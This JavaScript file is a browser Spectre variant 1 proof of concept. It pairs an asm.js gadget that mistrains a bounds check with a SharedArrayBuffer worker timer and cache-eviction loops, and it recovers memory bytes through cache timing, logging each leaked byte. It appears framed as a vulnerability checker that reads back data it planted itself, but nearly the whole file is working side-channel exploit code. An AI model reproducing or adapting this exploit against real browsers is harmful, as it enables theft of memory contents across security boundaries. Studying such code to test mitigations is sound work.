function asmModule(stdlib, forgein, heap) {
  'use asm'
  const simpleByteArray = new stdlib.Uint8Array(heap);
  const probeTable = new stdlib.Uint8Array(heap);
  var junk = 0;

  function init() {
    var i = 0;
    var j = 0;
    for (i = 0; (i | 0) < 16; i = (i + 1) | 0) {
      simpleByteArray[i | 0] = ((i | 0) + 1) | 0;
    }
    for (i = 0; (i | 0) < 30; i = (i + 1) | 0) {
      j = ((((i | 0) * 8192) | 0) + 0x1000000) | 0
      simpleByteArray[(j | 0)] = 0x10;
    }
  }

  function vul_call(index, sIndex) {
    index  = index | 0;
    sIndex = sIndex | 0;
    var arr_size = 0;
    var j = 0;
    junk  = probeTable[0] | 0;
    j = ((((sIndex | 0) * 8192) | 0) + 0x1000000) | 0;
    arr_size = simpleByteArray[(j | 0)] | 0;
    if ((index | 0) < (arr_size | 0)) {
      index = simpleByteArray[index | 0] | 0;
      index = ((index * 0x1000) | 0);
      junk  = (junk ^ (probeTable[index] | 0)) | 0;
    }
  }

  function flush() {
    var i = 0;
    var curr = 0;
    for (i = 256; (i | 0) < 16640; i = (i + 1) | 0) {
      curr = probeTable[((i | 0) * 512) | 0] | 0;
    }
  }
  return {
    vul_call: vul_call,
    init:     init,
    flush:    flush
  }
}

function clflush(size, eView) {
  const offset = 64;
  let curr;
  for (let i = 0; i < ((size) / offset); i++) {
    curr = eView.getUint32(i * offset);
  }
  return curr
}

function start(sharedArray) {
  reset(sharedArray);
  return now(sharedArray);
}

function now(sharedArray) {
  return Atomics.load(sharedArray, 0)
}

function reset(sharedArray) {
  Atomics.store(sharedArray, 0, 0)
}


function check(num, data_array) {
  const worker = new Worker('timer.js');

  const sharedBuffer = new SharedArrayBuffer(10 * Uint32Array.BYTES_PER_ELEMENT);
  const sharedArray = new Uint32Array(sharedBuffer);

  // ここで sharedBuffer を worker に送る
  // worker は値を 0 にしてから add し続け
  // こっちでそれを読み出すと timer になる
  // const worker = new Worker('timer.js');
  // const sharedBuffer = new SharedArrayBuffer(10 * Uint32Array.BYTES_PER_ELEMENT);
  // worker.postMessage(sharedBuffer);
  // worker.onmessage = function(msg) {
  //   // start
  //   Atomics.store(sharedArray, 0, 0)
  //   // timer
  //   console.log(Atomics.load(sharedArray, 0))
  // }
  console.log('postmessage >>')
  worker.postMessage(sharedBuffer);

  const simpleByteArrayLength = 16;
  const TABLE1_STRIDE = 0x1000;
  const TABLE1_BYTES = 0x3000000;
  const CACHE_HIT_THRESHOLD = 0
  const probeTable = new Uint8Array(TABLE1_BYTES);

  const cache_size = num * 1024 * 1024;
  const evictionBuffer = new ArrayBuffer(cache_size);
  const evictionView = new DataView(evictionBuffer);
  let current = clflush(cache_size, evictionView);

  const asm = asmModule(this, {}, probeTable.buffer)

  worker.onmessage = function (msg) {
    console.log(`<< on${msg.type} ${msg.data}`)

    function readMemoryByte(malicious_x) {
      const results = new Uint32Array(257);
      const simpleByteArray = new Uint8Array(probeTable.buffer);
      let junk = 0;
      let j = -1;
      let k = -1;

      for (let tries = 99; tries > 0; tries--) {
        const training_x = tries % simpleByteArrayLength;
        current = clflush(cache_size, evictionView);
        const time3 = start(sharedArray);
        junk = simpleByteArray[0];
        const time4 = now(sharedArray);

        for (let l = 29; l >= 0; l--) {
          for (let m = 0; m < 100; m++) { }
          let x = ((l % 6) - 1) & ~0xFFFF;
          x = (x | (x >> 16));
          x = training_x ^ (x & (malicious_x ^ training_x));
          asm.vul_call(x, l);
        }

        for (let n = 0; n < 256; n++) {
          const mix_i = n;
          const timeS = start(sharedArray);
          junk = probeTable[(mix_i * TABLE1_STRIDE)];
          const timeE = now(sharedArray);
          if (timeE - timeS <= CACHE_HIT_THRESHOLD && mix_i != simpleByteArray[tries % simpleByteArrayLength]) {
            results[mix_i]++;
          }
        }

        for (let o = 0; o < 256; o++) {
          if (j < 0 || results[o] >= results[j]) {
            k = j;
            j = o;
          } else if (k < 0 || results[o] >= results[k]) {
            k = o;
          }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) {
          break;
        }
      }

      results[256] ^= junk;
      return [j, k, results[j], results[k]]
    }

    function readMemoryByteWrapper(malicious_x) {
      const rlt = readMemoryByte(malicious_x);

      if (rlt[0] != 0) {
        return rlt[0]
      } else {
        clflush(cache_size, evictionView);
        const com_rlt = readMemoryByte(malicious_x);
        if (com_rlt[1] == rlt[1] || com_rlt[0] == rlt[1]) {
          return rlt[1]
        }
        if (com_rlt[0] == 0 || com_rlt[1] == 0) {
          return com_rlt[0]
        }
        return -1;
      }
    }

    asm.init();
    for (let x = 0; x < 0x1000; x++) {
      asm.vul_call(1, 0);
      clflush(64, evictionView);
    }

    const simpleByteArray = new Uint8Array(probeTable.buffer);
    for (let y = 0; y < data_array.length; y++) {
      simpleByteArray[0x2200000 + y] = data_array[y]
    }

    for (let z = 0; z < data_array.length; z++) {
      let data = readMemoryByteWrapper(0x2200000 + z)
      if (data != data_array[z]) {
        worker.terminate()

        if ((num * 2) < 256) {
          console.log("Processing", num * 2, "M cache, waiting...")
          check(num * 2, data_array)
        } else {
          console.log("Failed")
        }
        return
      } else {
        console.log(`leak off=0x ${(0x2200000 + z).toString(16)}, byte=0x${data.toString(16)} '${String.fromCharCode(data)}'`)
      }
    }

    worker.terminate()
    console.log("Succeeded")
    return
  }
}

function main(arr) {
  console.log("Start checking...")
  const num = 8;
  console.log("Processing", num, "M cache, waiting...")
  check(num, arr)
}
